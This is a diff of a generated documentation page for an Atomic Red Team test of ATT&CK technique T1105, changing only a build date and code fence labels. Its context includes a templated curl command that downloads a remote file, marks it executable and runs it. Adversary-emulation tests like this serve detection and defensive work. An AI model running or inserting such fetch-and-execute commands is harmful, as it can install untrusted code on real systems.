@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3"
@@ -56,13 +56,13 @@ Utilize linux Curl to download a remote file, chmod +x it and run it.
 
 ### Command
 
-```sh
+```bash
 curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
 ```
 
 ### Cleanup
 
-```sh
+```bash
 rm #{payload_name}
 ```
 
